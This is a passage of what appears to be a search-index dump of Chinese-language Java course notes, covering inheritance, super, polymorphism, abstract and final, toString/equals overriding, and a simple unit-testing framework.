<li>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4e0d\u5efa\u8bae\u5bf9\u5b57\u6bb5\u8fd9\u4e48\u505a\uff0c\u8fd9\u901a\u5e38\u610f\u5473\u7740\u4f60\u7684\u7c7b\u8bbe\u8ba1\u5f97\u4e0d\u597d</li> </ul> <pre><code>public class HiddenThing extends Thing {\n    public int x; // Hides super.x\n    protected float y; // Hides super.y\n\n    public void setSuperTo10() {\n        super.x = 10;\n        super.y = 10;\n    }\n\n    public void setTo100() {\n        x = 100;\n        y = 100;\n    }\n\n    public void print() {\n        // see full code\n    }\n\n    public void printSuper() {\n        // see full code\n    }\n\n    public static void main(String[] args) {\n        HiddenThing t = new HiddenThing();\n        t.setTo100();\n        t.setSuperTo10();\n        t.print();\n        t.printSuper();\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#super-in-inheritance-chains","title":"super in Inheritance Chains","text":"<pre><code>class A {\n    public void doSomething() {\n        System.out.println(\"A.doSomething()\");\n    }\n}\n\nclass B extends A {\n    public void doSomething() {\n        System.out.println(\"B.doSomething()\");\n    }\n}\n\nclass C extends B {\n    public void doSomething() {\n        super.doSomething();\n    }\n}\n\npublic class SuperclassMembers {\n    public static void main(String[] args) {\n        C c = new C();\n        c.doSomething();\n    }\n}\n</code></pre> <p>\u7b2c\u5341\u4e94\u884c\u7684 <code>super</code> \u6307\u5411\u7684\u5230\u5e95\u662f\u54ea\u4e2a <code>class</code></p> <p><code>super</code> always refers to the immediate superclass \u4e5f\u5c31\u662f\u6c38\u8fdc\u662f <code>extends</code> \u53c2\u6570\u540e\u9762\u7684\u90a3\u4e2a\u7c7b</p>"},{"location":"cs/java/basics/w6/#multiple-subclasses","title":"Multiple Subclasses","text":"<p>\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7c7b\u62d3\u5c55\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u590d\u6742\u7684\u7ee7\u627f\u6811\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u94fe\u5f0f\u7ed3\u6784</p> <pre><code>public class BasicSafeArray {\n    // see full code\n}\n\npublic class AppendableSafeArray extends BasicSafeArray {\n    public void append(int value) {\n        // see full code\n    }\n}\n\npublic class DeletableSafeArray extends BasicSafeArray {\n    public DeletableSafeArray(int size) {\n    super(size);\n\n    public void delete(int index) {\n        // todo\n        }\n    }\n}\n</code></pre> <p>\u90a3\u4e48\u5728\u6b63\u5f0f\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u53ef\u4ee5\u6a21\u62df\u7cfb\u7edf\u53d1\u80b2\u6811 Phylogenetic Tree \u7684\u5c42\u7ea7\u8fdb\u884c\u7c7b\u7684\u7ec4\u7ec7</p>"},{"location":"cs/java/basics/w6/#superclass-references","title":"Superclass References","text":"<p>Java \u4f5c\u4e3a\u5f3a\u7c7b\u578b\u8bed\u8a00\u5982\u679c\u6570\u636e\u7c7b\u578b\u4e0d\u5339\u914d\u4f1a\u62a5\u9519\uff0c\u9664\u975e\u6709\u81ea\u52a8\u6216\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362</p> <p>\u4f46\u662f <code>X myObj = new Y()</code> \u5982\u679c Y extends X \u5c31\u4e0d\u4f1a\u62a5\u9519\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48</p> <ul> <li>When we say Y extends X we\u2019re say that Y is a X</li> <li>This is a relationship is really what extends captures</li> </ul>"},{"location":"cs/java/basics/w6/#method-overriding","title":"Method Overriding","text":"<p>\u7531\u6b64\u5f15\u51fa <code>polymorphism</code> \u591a\u6001\u6027</p> <pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void talk() {\n        super.talk();\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class SuperGoose {\n    public static void main(String[] args) {\n        Goose a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <p>The talk method is getting hidden</p>"},{"location":"cs/java/basics/w6/#dynamic-dispatch","title":"Dynamic Dispatch","text":"<p>\u52a8\u6001\u5206\u6d3e\u662f\u4e00\u79cd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u8981\u8c03\u7528\u7684\u65b9\u6cd5\u7684\u6280\u672f\u3002\u5b83\u5141\u8bb8\u7a0b\u5e8f\u6839\u636e\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b\u800c\u4e0d\u662f\u58f0\u660e\u7684\u7c7b\u578b\u6765\u9009\u62e9\u6b63\u786e\u7684\u65b9\u6cd5\u3002\u8fd9\u4f7f\u5f97\u4ee3\u7801\u66f4\u7075\u6d3b\uff0c\u652f\u6301\u591a\u6001\u6027\uff0c\u5e76\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u884c\u4e3a\u3002</p> <pre><code>public class AnimalOverride {\n    public static void main(String[] args) {\n        Animal a = new Animal();\n        a.talk();\n        a = new Goose();\n        a.talk();\n        a = new Dog();\n        a.talk();\n    }\n}\n</code></pre> <p>\u7531\u4e8e Goose, Dog \u90fd\u662f Animal \u56e0\u6b64\u8fd9\u6837\u5206\u914d\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u4f1a\u5728\u6267\u884c\u65f6\u81ea\u52a8\u6839\u636e\u5bf9\u8c61\u7c7b\u578b\u5bfb\u627e\u65b9\u6cd5\uff0c\u8fd9\u5b9e\u73b0\u4e86\u591a\u6001\u6027</p>"},{"location":"cs/java/basics/w6/#expression","title":"Expression","text":"<p>\u8fd9\u9053\u9898\u5c31\u662f Test1 \u4e2d\u7684\uff0c\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u7b80\u6613\u7f16\u7a0b\u8bed\u8a00</p> <pre><code>public class Expression {\n    public void describe() {\n        System.out.println(\"unknown\");\n    }\n\n    public int evaluate() {\n        return 0;\n    }\n\n    public static void main(String[] args) {\n        Expression expr = new Multiply(new Value(2), new Value(3));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Add(new Value(2), new Value(3));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Add(new Multiply(new Value(2), new Value(3)), new Value(4));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Value(1);\n        for (int i = 2; i &lt;= 10; i++)\n            expr = new Add(expr, new Value(i));\n        expr.describe();\n        System.out.println(\" = sum of 1 to 10 = \" + expr.evaluate());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u7528\u5176\u591a\u6001\u6027\u7684\u5e94\u7528\u53bb\u5b9e\u73b0\uff0c\u8fd9\u9053\u9898\u4e0a\u8bfe\u7684\u65f6\u5019 11 \u5b9e\u9645\u4e0a\u82b1\u8d39\u4e86\u5927\u91cf\u65f6\u95f4\u8bb2\u89e3</p>"},{"location":"cs/java/basics/w6/#multiply","title":"Multiply","text":"<pre><code>class Multiply extends Expression {\n    private Expression left;\n    private Expression right;\n\n    public Multiply(Expression left, Expression right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" * \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    public int evaluate() {\n        return left.evaluate() * right.evaluate();\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#add","title":"Add","text":"<pre><code>class Add extends Expression {\n    private Expression left;\n    private Expression right;\n\n    public Add(Expression left, Expression right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" + \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    public int evaluate() {\n        return left.evaluate() + right.evaluate();\n    }\n}\n</code></pre> <pre><code>expr = new Add(new Multiply(new Value(2), new Value(3)), new Value(4));\nexpr.describe();\nSystem.out.println(\" = \" + expr.evaluate());\n</code></pre> <p>\u8fd9\u6837\u7684\u8c03\u7528\u65b9\u5f0f\u4f1a\u542f\u7528 stack tree \u5b8c\u6210</p>"},{"location":"cs/java/basics/w6/#override","title":"@Override","text":"<pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void tallk() { // Oops, typo!\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class AnimalTypo {\n    public static void main(String[] args) {\n        Animal a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <p>Method overriding \u5e38\u5e38\u6210\u4e3a\u95ee\u9898\u6765\u6e90\uff1a- @Test2</p> <ul> <li>The method must have exactly the same signature (name and parameter list), otherwise</li> <li>It will just be a method overload \u8fc7\u8f7d\u548c\u8986\u5199\u662f\u4e24\u4e2a\u4e1c\u897f\uff0c\u628a\u7236\u7c7b\u7684\u76f8\u540c\u51fd\u6570\u91cd\u5199\u4e00\u904d\u53eb <code>override</code></li> <li>If we make a typo, the compiler will not help us - \u6253\u9519\u5b57\u90a3\u4e48\u7f16\u8bd1\u5668\u4e0d\u4f1a\u5e2e\u6211\u4eec\u8bc6\u522b</li> <li>\u52a0\u4e00\u4e2a annotation \u540e\u7f16\u8bd1\u5668\u4f1a\u76f4\u63a5\u8fd4\u56de\u9519\u8bef\uff0c\u8fd9\u79cd\u65b9\u6cd5\u66f4\u4e3a\u4e25\u8c28</li> </ul>"},{"location":"cs/java/basics/w6/#sdlc","title":"SDLC","text":"<p>\u8fd9\u5c31\u662f\u8f6f\u4ef6\u5f00\u53d1\u751f\u547d\u5468\u671f\uff0c\u8bb2\u8ff0\u4e86\u8f6f\u4ef6\u5f00\u53d1\u662f\u600e\u4e48\u6837\u8fdb\u884c\u7684\uff0c\u5faa\u73af\u7684\u672c\u8d28\u53cd\u6620\u4e86\u5f00\u53d1\u8f6f\u4ef6\u901a\u5e38\u662f\u8fed\u4ee3\u7684\u3002Java \u548c\u7c7b\u5f88\u9002\u5408 SDLC \u7684\u5f00\u53d1\u6d41\u7a0b\uff1a</p> <ul> <li>\u8bbe\u8ba1\u9636\u6bb5\u9700\u8981\u628a\u95ee\u9898\u5206\u89e3\u6210\u4e00\u4e2a\u4e2a\u7c7b\u3002</li> <li>\u5b9e\u73b0\u9636\u6bb5\u5c31\u662f\u7f16\u5199\u8fd9\u4e9b\u7c7b\u3002</li> <li>\u7c7b\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u6e05\u6670\u7684\u3001\u53ef\u6d4b\u8bd5\u7684\u4ee3\u7801\u201c\u5355\u5143\u201d\uff0c\u8fd9\u4f7f\u5f97\u6d4b\u8bd5\u66f4\u5bb9\u6613\u3002</li> <li>\u6570\u636e\u9690\u85cf\u548c\u62bd\u8c61\u8ba9\u6211\u4eec\u5728\u4e0d\u6539\u53d8\u63a5\u53e3\u7684\u60c5\u51b5\u4e0b\u66f4\u65b0\u5b9e\u73b0\uff0c\u4ece\u800c\u4f7f\u7ef4\u62a4\u66f4\u5bb9\u6613\u3002</li> </ul>"},{"location":"cs/java/basics/w7/","title":"7.0 More, Packages","text":""},{"location":"cs/java/basics/w7/#more-inheritance","title":"More inheritance","text":""},{"location":"cs/java/basics/w7/#abstract","title":"abstract","text":"<pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void talk() {\n        System.out.println(\"Honk!\");\n    }\n}\n</code></pre> <p>Animal \u4e2d\u5f3a\u884c\u5b9e\u73b0\u7684 talk \u5f88\u5947\u602a\uff0c\u56e0\u6b64\u5982\u679c\u4e0d\u5b9e\u73b0\u5c31\u9700\u8981\u7528\u5230 <code>abstract</code></p>"},{"location":"cs/java/basics/w7/#abstractanimal","title":"AbstractAnimal","text":"<pre><code>abstract class Animal {\n    public abstract void talk();\n}\n\nclass Goose extends Animal {\n    @Override\n    public void talk() {\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class AbstractAnimal {\n    public static void main(String[] args) {\n        Animal a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <ul> <li>\u4efb\u4f55\u7c7b\u90fd\u53ef\u4ee5\u88ab\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b</li> <li><code>new Animal()</code> leads to an error, \u62bd\u8c61\u7c7b\u65e0\u6cd5\u88ab\u521d\u59cb\u5316</li> <li>\u4efb\u4f55\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u7c7b\u90fd\u9700\u8981\u88ab\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b</li> <li>\u62bd\u8c61\u65b9\u6cd5 need no nody</li> <li>Abstract methods must be overridden by subclasses</li> <li>unless the subclass is abstract too</li> </ul>"},{"location":"cs/java/basics/w7/#mistakes","title":"Mistakes","text":"<pre><code>abstract class Animal {\n    public abstract void talk();\n}\n\nclass Goose extends Animal {\n    // Error: Did not override abstract method talk()\n}\n\npublic class AbstractError {\n    public static void main(String[] args) {\n        Animal a = new Animal(); // Error: Cannot instantiate the type Animal\n        a.talk();\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u5c31\u662f\u5e38\u89c1\u9519\u8bef\uff0c\u5b50\u7c7b\u6ca1\u6709\u91cd\u8f7d\uff0c\u5bf9\u62bd\u8c61\u7c7b\u8fdb\u884c\u4e86\u521d\u59cb\u5316</p>"},{"location":"cs/java/basics/w7/#final","title":"final","text":"<ul> <li>\u6709\u65f6\u5019\u6211\u4eec\u60f3\u8981\u62bd\u8c61\u7684\u53cd\u4e49\u8bcd\u3002</li> <li>\u62bd\u8c61\u65b9\u6cd5\u5fc5\u987b\u88ab\u91cd\u5199\u3002</li> <li><code>final</code> \u65b9\u6cd5\u6c38\u8fdc\u4e0d\u80fd\u88ab\u91cd\u5199\u3001\u7ee7\u627f\u3002</li> <li>\u6ce8\u610f\uff0c\u4e00\u4e2a\u6709 <code>final</code> \u65b9\u6cd5\u7684\u7c7b\u4e0d\u4e00\u5b9a\u662f <code>final</code> \u7c7b</li> </ul>"},{"location":"cs/java/basics/w7/#final-classes-and-methods","title":"<code>final</code> Classes and Methods","text":"<pre><code>abstract class Animal {\n    public abstract int numLegs();\n}\n\nclass Spider extends Animal {\n    public final int numLegs() {\n        // All spiders have 8 legs\n        return 8;\n    }\n}\n\nclass SpiderWith6Legs extends Spider {\n    // Error: Cannot override the final method from Spider\n    // public int numLegs() {\n    // return 6;\n    // }\n}\n</code></pre> <p>\u5728\u7c7b\u4e2d\u4f7f\u7528 <code>final</code> \u65b9\u6cd5\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u4efb\u4f55\u4eba\u9519\u8bef\u7684\u4ece\u4f60\u7684\u7c7b\u4e2d\u7ee7\u627f</p>"},{"location":"cs/java/basics/w7/#final-variables","title":"<code>final</code> variables","text":"<pre><code>public class FinalVariable {\n    public static void main(String[] args) {\n        final int x = 5;\n        // x = 6; // Error: Cannot assign a value to final variable 'x'\n        final double y;\n        y = 10.5;\n        // y = 1.1; // Error: Cannot assign a value to final variable 'y'\n        System.out.println(x);\n        System.out.println(y);\n    }\n}\n</code></pre> <p>\u4f5c\u4e3a\u5e38\u91cf\u4e0d\u518d\u53ef\u53d8</p> <pre><code>public class CircleTools {\n    public static final double PI = 3.14159;\n\n    public static double area(double radius) {\n        return PI * radius * radius;\n    }\n\n    public static double circumference(double radius) {\n        return 2 * PI * radius;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Area of a circle with radius 5: \" + area(5));\n        System.out.println(\"Circumference of a circle with radius 5: \" + circumference(5));\n    }\n}\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4 <code>final</code> \u8fd8\u548c <code>static</code> \u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u76ee\u7684\u662f\u9632\u6b62\u4efb\u4f55\u4eba\u91cd\u65b0\u5b9a\u4e49\u534a\u5f84</p>"},{"location":"cs/java/basics/w7/#the-object-class","title":"The Object Class","text":"<p>Java \u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u7c7b\u53eb\u505a Object</p> <ul> <li>\u6bcf\u4e2a\u7c7b\u90fd\u7ee7\u627f\u81ea Object\uff08\u9664\u4e86 Object \u672c\u8eab\uff09</li> <li>\u8fd9\u610f\u5473\u7740 Java \u4e2d\u7684\u6bcf\u4e2a\u7c7b\u5728\u6280\u672f\u4e0a\u90fd\u5728\u540c\u4e00\u4e2a\u7ee7\u627f\u6811\u4e2d</li> <li>Object \u6709\u4e00\u4e9b\u65b9\u6cd5\uff0c\u8fd9\u610f\u5473\u7740\u6bcf\u4e2a\u7c7b\u90fd\u81ea\u5e26\u8fd9\u4e9b\u65b9\u6cd5</li> <li>\u6709\u65f6\u5019\uff0c\u4f60\u4f1a\u60f3\u8981\u91cd\u5199\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b</li> </ul> <p>\u4eca\u5929\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8 toString() \u548c equals()\u3002</p>"},{"location":"cs/java/basics/w7/#tostring","title":"<code>toString()</code>","text":"<ul> <li><code>.toString()</code> \u65b9\u6cd5\u7528\u4e8e\u5c06\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f: \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4e3b\u8981\u5de5\u4f5c\u5c31\u662f\u63d0\u4f9b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6587\u672c\u63cf\u8ff0\u3002\u5f53\u4f60\u9700\u8981\u628a\u4e00\u4e2a\u5bf9\u8c61\u7528\u6587\u5b57\u8868\u8fbe\u51fa\u6765\u65f6\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u5b83\u7684 <code>toString()</code> \u65b9\u6cd5\u3002</li> <li>\u8fd9\u4e2a\u65b9\u6cd5\u5728 Object \u7c7b\u4e2d\u610f\u5473\u7740\u6240\u6709\u5bf9\u8c61\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a\u5b57\u7b26\u4e32: \u56e0\u4e3a <code>toString()</code> \u662f <code>Object</code> \u7c7b\u7684\u65b9\u6cd5\uff0c\u800c\u6240\u6709\u7c7b\u90fd\u7ee7\u627f\u81ea <code>Object</code>\uff0c\u6240\u4ee5 Java \u4e2d\u7684\u4efb\u4f55\u5bf9\u8c61\u90fd\u5177\u5907\u5c06\u81ea\u5df1\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u7684\u80fd\u529b\uff08\u5373\u4f7f\u53ea\u662f\u9ed8\u8ba4\u7684\u3001\u4e0d\u592a\u6613\u8bfb\u7684\u683c\u5f0f\uff09\u3002</li> <li>\u5f53\u6211\u4eec\u8fdb\u884c\u5b57\u7b26\u4e32\u8fde\u63a5 (\"a string\"+myObject) \u65f6\uff0cmyObject.toString() \u4f1a\u88ab\u8c03\u7528: \u5982\u679c\u4f60\u7528 <code>+</code> \u53f7\u628a\u4e00\u4e2a\u5b57\u7b26\u4e32\u548c\u4e00\u4e2a\u5bf9\u8c61\u8fde\u63a5\u8d77\u6765\uff0cJava \u4f1a\u81ea\u52a8\u8c03\u7528\u90a3\u4e2a\u5bf9\u8c61\u7684 <code>toString()</code> \u65b9\u6cd5\uff0c\u5f97\u5230\u5b83\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8fde\u63a5\u3002</li> <li>\u5bf9\u4e8e System.out.println(myObject) \u4e5f\u662f\u4e00\u6837: \u5f53\u4f60\u6253\u5370\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c<code>println</code> \u65b9\u6cd5\u5185\u90e8\u4e5f\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u5bf9\u8c61\u7684 <code>toString()</code> \u65b9\u6cd5\uff0c\u7136\u540e\u6253\u5370\u8fd4\u56de\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\u3002</li> <li>\u91cd\u5199 .toString() \u8ba9\u6211\u4eec\u80fd\u591f\u63a7\u5236\u6211\u4eec\u7684\u5bf9\u8c61\u5982\u4f55\u88ab\u6253\u5370: \u901a\u8fc7\u5728\u4f60\u81ea\u5df1\u7684\u7c7b\u91cc\u91cd\u65b0\u5b9e\u73b0 <code>toString()</code> \u65b9\u6cd5\uff08\u5373\u201c\u91cd\u5199\u201d\uff09\uff0c\u4f60\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5f53\u5bf9\u8c61\u9700\u8981\u88ab\u8868\u793a\u4e3a\u5b57\u7b26\u4e32\u65f6\uff08\u6bd4\u5982\u6253\u5370\u6216\u5b57\u7b26\u4e32\u8fde\u63a5\u65f6\uff09\uff0c\u5e94\u8be5\u663e\u793a\u6210\u4ec0\u4e48\u6837\u5b50\u3002\u8fd9\u80fd\u8ba9\u8f93\u51fa\u7684\u4fe1\u606f\u66f4\u6709\u610f\u4e49\u3001\u66f4\u6613\u4e8e\u7406\u89e3\u3002</li> </ul> <pre><code>class MyClass {\n    private int x;\n    private int y;\n\n    public MyClass(int x, int y) {\n        this.x = x;\n        this.y = y;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyClass(\" + x + \"},\" + y + \")\";\n    }\n\n    public class ToString {\n        public static void main(String[] args) {\n            MyClass mc = new MyClass(5, 10);\n            System.out.println(mc);\n            System.out.println(\"mc.toString() = \" + mc);\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w7/#equals","title":"<code>equals()</code>","text":"<p>\u5c31\u50cf <code>toString()</code> \u4e00\u6837\uff0c\u6240\u6709\u7684 Java \u5bf9\u8c61\u90fd\u4ece <code>Object</code> \u7c7b\u90a3\u91cc\u514d\u8d39\u5f97\u5230\u4e86\u4e00\u4e2a\u57fa\u7840\u7248\u7684 <code>.equals()</code> \u65b9\u6cd5\u3002\u4f46\u662f\u8fd9\u4e2a\u57fa\u7840\u7248\u7684 <code>equals()</code> \u65b9\u6cd5\uff0c\u5b83\u7684\u884c\u4e3a\u8ddf <code>==</code> \u4e00\u6a21\u4e00\u6837 \u5b83\u4e5f\u53ea\u662f\u68c0\u67e5\u662f\u4e0d\u662f\u5185\u5b58\u91cc\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002\u8fd9\u901a\u5e38\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\u201c\u5185\u5bb9\u76f8\u7b49\u201d\u7684\u6bd4\u8f83\u3002\u4e0d\u50cf <code>String</code> \u7c7b\u5df2\u7ecf\u7cbe\u5fc3\u8bbe\u8ba1\u8fc7\uff0c\u5b83\u91cd\u5199\u4e86 <code>equals()</code> \u65b9\u6cd5\uff0c\u4e13\u95e8\u68c0\u67e5\u4e24\u4e2a\u5b57\u7b26\u7684\u5e8f\u5217\u5185\u5bb9\u662f\u5426\u5b8c\u5168\u4e00\u6837\u3002\u53ef\u4ee5\u53ef\u4ee5\u770b\u5230\u5176\u662f\u5982\u4f55\u81ea\u5b9a\u4e49\u539f\u672c\u9ed8\u8ba4\u51fd\u6570\u7684\uff1a</p> <pre><code>class StringPair {\n    String first, second;\n\n    public StringPair(String first, String second) {\n        this.first = first;\n        this.second = second;\n    }\n\n    @Override\n    public boolean equals(Object other) {\n        // Make sure that other is a StringPair\n        if (other instanceof StringPair) {\n            StringPair otherPair = (StringPair) other; // Cast to StringPair\n            // Use String .equals() to compare the two Strings\n            return first.equals(otherPair.first) &amp;&amp; second.equals(otherPair.second);\n        }\n        return false;\n    }\n}\n</code></pre> <p>\u7b2c\u4e5d\u884c\u91cd\u5199\u539f\u65b9\u6cd5\u7b7e\u540d</p> <pre><code>@Override\n// \u91cd\u5199\u7236\u7c7b\uff08Object\uff09\u7684 equals \u65b9\u6cd5\npublic boolean equals(Object other) { \n// \u63a5\u6536\u4efb\u4f55\u7c7b\u578b\u7684\u5bf9\u8c61 other\n</code></pre> <p>\u68c0\u67e5 <code>other</code> \u8fd9\u4e2a\u7c7b\u5c5e\u4e0d\u5c5e\u4e8e <code>StringPair</code> \u7c7b\u578b\u6216\u662f\u5176\u5b50\u7c7b\u578b\uff0c\u4e0d\u662f\u5c31\u8fd4\u56de <code>false</code></p> <p>\u662f\u7684\u8bdd\u5c06 <code>other</code> \u4ece\u901a\u7528 <code>Object</code> \u7c7b\u578b\u5f3a\u5236\u8f6c\u6362 (cast) \u6210 <code>StringPair</code> \u7c7b\u578b</p> <pre><code>// \u628a other \u4ece\u201c\u4efb\u4f55\u4e1c\u897f\u201d\u660e\u786e\u8f6c\u6362\u6210\u201cStringPair\u201d\u7c7b\u578b\n</code></pre> <p>\u7136\u540e\u501f\u7528 <code>String</code> \u7c7b\u578b\u7684 <code>equals</code> \u51fd\u6570\u5bf9\u6bd4\u5b8c\u6210\u4efb\u52a1</p> <pre><code>public class Equals { \n    // Notice how this will work regardless of which classes are really in the array \n    public static boolean allEqual(Object[] objects) { \n        if (objects.length == 0) { \n            return true; \n        } \n        Object first = objects[0]; \n        for (int i = 1; i &lt; objects.length; i++) { \n            if (!first.equals(objects[i])) { \n                return false; \n            } \n        } \n        return true; \n    } \n\n    public static void main(String[] args) { \n        StringPair[] pairs = new StringPair[3]; \n        pairs[0] = new StringPair(\"Hello\", \"World\"); \n        pairs[1] = new StringPair(\"Hello\", \"World\"); \n        pairs[2] = new StringPair(\"Hello\", \"World\"); \n\n        System.out.println(allEqual(pairs)); \n    } \n}\n</code></pre> <p>\u4ee5\u4e0a\u521b\u9020\u4e86\u4e00\u4e2a\u51fd\u6570\u53eb <code>allEqual</code> \u4e00\u6837\u501f\u7528 <code>String</code> \u7684\u76f8\u7b49\u65b9\u6cd5\u5b8c\u6210\u4efb\u52a1</p>"},{"location":"cs/java/basics/w7/#the-sdlc-and-testing","title":"The SDLC and Testing","text":"<p>SDLC \u7684\u7b2c\u4e94\u6b65\u662f <code>Testing</code></p>"},{"location":"cs/java/basics/w7/#unit-testing","title":"Unit Testing","text":"<ul> <li>\u5355\u5143\u6d4b\u8bd5\u662f\u5728\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u521b\u5efa\u7684\u81ea\u52a8\u6d4b\u8bd5</li> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u662f\u552f\u4e00\u80fd\u8ba9\u4eba\u76f8\u4fe1\u4f60\u7684\u4ee3\u7801\u80fd\u6b63\u5e38\u5de5\u4f5c\u7684\u597d\u65b9\u6cd5</li> <li>\u6709\u65f6\u5019\uff0c\u4eba\u4eec\u4f1a\u9075\u5faa\u4e00\u79cd\u53eb\u505a\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\u7684\u6d41\u7a0b</li> <li>\u9996\u5148\u5199\u6d4b\u8bd5\uff0c\u7136\u540e\u5199\u4ee3\u7801\u8ba9\u8fd9\u4e9b\u6d4b\u8bd5\u901a\u8fc7</li> <li>\u867d\u7136\u8f6f\u4ef6\u5f00\u53d1\u7684\u751f\u547d\u5468\u671f\u542c\u8d77\u6765\u53ef\u80fd\u6709\u70b9\u62bd\u8c61\uff0c\u4f46\u5355\u5143\u6d4b\u8bd5\u662f\u975e\u5e38\u5b9e\u7528\u7684</li> </ul> <p>JUnit \u662f\u65e9\u671f\u4e3b\u8981\u7684\u5355\u5143\u6d4b\u8bd5\u6846\u67b6\u4e4b\u4e00\uff0c\u5b83\u662f\u4e3a Java \u5b9a\u5236\u7684\uff0c\u529f\u80fd\u975e\u5e38\u5f3a\u5927\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5355\u72ec\u6d4b\u8bd5\u6bcf\u4e2a\u7c7b\uff01\u9488\u5bf9\u4e0d\u540c\u8bed\u8a00\u6709\u5f88\u591a\u8fd9\u6837\u7684\u6846\u67b6\u3002\u5b66\u4e60\u6846\u67b6\u4e0d\u662f\u8fd9\u95e8\u8bfe\u7a0b\u7684\u8303\u7574\uff0c\u5c3d\u7ba1\u4f60\u5e94\u8be5\u77e5\u9053\u5b83\u4eec\u7684\u5b58\u5728\u548c\u4f7f\u7528\u3002\u6211\u4eec\u4f1a\u7528\u6211\u4eec\u81ea\u5df1\u7684\uff08\u7b80\u5355\u7684\uff09\u6846\u67b6\u6765\u505a\u4e00\u4e2a\u57fa\u672c\u7684\u5355\u5143\u6d4b\u8bd5\u4ecb\u7ecd\uff0c\u5e76\u4e14\u5728\u8fc7\u7a0b\u4e2d\u4f1a\u7528\u5230\u62bd\u8c61\u548c\u6700\u7ec8\u7c7b\u3002</p>"},{"location":"cs/java/basics/w7/#simpleunittest","title":"SimpleUnitTest","text":"<pre><code>public abstract class SimpleUnitTest {\n    public static final void assertTrue(boolean condition) {\n        // See full code for details\n        // Error if condition is false\n    }\n\n    public abstract void runAllTests();\n\n    public static final void main(String[] args) {\n        // See full code for details\n        // Look for a class named arg[0]\n        // If it is a subclass of SimpleUnitTest, call runAllTests()\n    }\n}\n</code></pre> <ul> <li><code>assertTrue()</code> \u548c <code>main()</code> \u662f\u6700\u7ec8\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u6c38\u8fdc\u4e0d\u9700\u8981\u88ab\u4fee\u6539\u3002</li> <li><code>runAllTests()</code> \u662f\u62bd\u8c61\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u88ab\u91cd\u5199\u3002</li> </ul> <p>\u6211\u4eec\u6765\u6d4b\u8bd5\u4e00\u4e0b\u4e4b\u524d\u63d0\u5230\u7684 <code>Expression</code> \u7c7b\uff1a</p> <p>\u5355\u72ec\u5efa\u7acb\u4e00\u4e2a <code>ExpressionTest.java</code> </p> <pre><code>public class ExpressionTest extends SimpleUnitTest {\n    void testAddition() {\n        assertTrue(new Add(new Value(1), new 